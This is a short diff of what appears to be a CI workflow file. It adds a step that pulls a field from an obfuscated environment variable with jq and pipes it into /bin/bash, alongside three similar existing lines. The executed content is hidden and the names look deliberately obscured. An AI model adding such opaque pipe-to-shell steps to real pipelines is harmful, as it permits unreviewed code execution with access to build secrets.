@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$jlf2" | jq -r .iv78368 | /bin/bash
           printf '%s' "$gzdg5" | jq -r .dviun6 | /bin/bash
           echo $jjiz79 | jq -r .bpcd6 | /bin/bash
+          printf '%s' "$pel2" | jq -r .qz289 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
